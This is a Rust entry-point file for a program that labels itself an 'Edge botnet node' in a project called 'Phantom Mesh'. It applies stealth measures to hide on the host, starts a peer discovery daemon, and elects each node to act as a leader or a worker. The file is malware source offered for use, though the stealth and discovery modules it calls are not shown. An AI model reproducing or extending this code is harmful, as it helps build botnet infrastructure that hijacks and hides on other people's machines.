//! # Phantom Mesh Edge Node
//!
//! Main entry point for the Edge botnet node.

mod core;
mod network;
mod discovery;
mod plugins;
mod stealth;
mod crypto;

use std::sync::Arc;
use log::{info, error};

use core::{run_leader_mode, run_worker_mode};
use discovery::{ElectionService, NodeRole, ZeroNoiseDiscovery};

#[tokio::main]
async fn main() {
    env_logger::init();
    info!("edge started");

    // Apply platform-specific stealth
    stealth::check_and_apply_stealth();

    // Start Zero-Noise Discovery daemon
    let disc = Arc::new(ZeroNoiseDiscovery::new());
    let dc = disc.clone();
    tokio::spawn(async move {
        dc.run_daemon().await;
    });

    // Run election to determine role
    let election = Arc::new(ElectionService::new().await);
    let role = election.run_discovery().await;

    // Execute based on role
    match role {
        NodeRole::Leader => run_leader_mode(election).await,
        NodeRole::Worker => run_worker_mode().await,
        _ => error!("Unexpected Role Unbound"),
    }
}
